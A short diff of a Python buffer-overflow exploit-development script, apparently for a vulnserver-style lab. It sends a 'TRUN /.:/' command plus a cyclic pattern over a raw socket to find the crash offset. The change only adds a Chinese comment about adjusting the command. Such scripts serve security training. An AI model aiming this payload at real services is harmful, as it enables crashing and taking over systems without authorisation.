@@ -49,7 +49,7 @@ def main():
         print(f"[+] Pattern generated. Sending to {ip}:{port}")
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.connect((ip, port))
-        payload = b"TRUN /.:/" + pattern.encode()
+        payload = b"TRUN /.:/" + pattern.encode()                         # 修改为适当的命令
         s.send(payload)
         try:
             s.settimeout(10)
